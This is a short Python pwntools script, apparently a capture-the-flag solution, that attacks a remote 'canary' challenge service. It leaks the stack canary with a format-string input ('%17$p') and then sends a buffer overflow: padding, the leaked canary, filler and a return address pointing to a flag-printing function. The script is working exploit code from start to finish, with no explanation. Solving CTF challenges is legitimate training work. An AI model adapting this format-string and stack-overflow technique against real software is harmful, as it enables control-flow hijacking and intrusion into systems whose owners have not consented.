from pwn import *

p=remote("shell.actf.co",20701)
#p=process("./canary")
p.sendline("%17$p")
p.recvuntil("Nice to meet you, ")
leak=int(p.recvline()[2:-2],16)
flag=0x000000000040078b
payload=""
payload+="A"*56
payload+=p64(leak)
payload+="A"*8
payload+=p64(flag)

p.sendline(payload)
p.interactive()










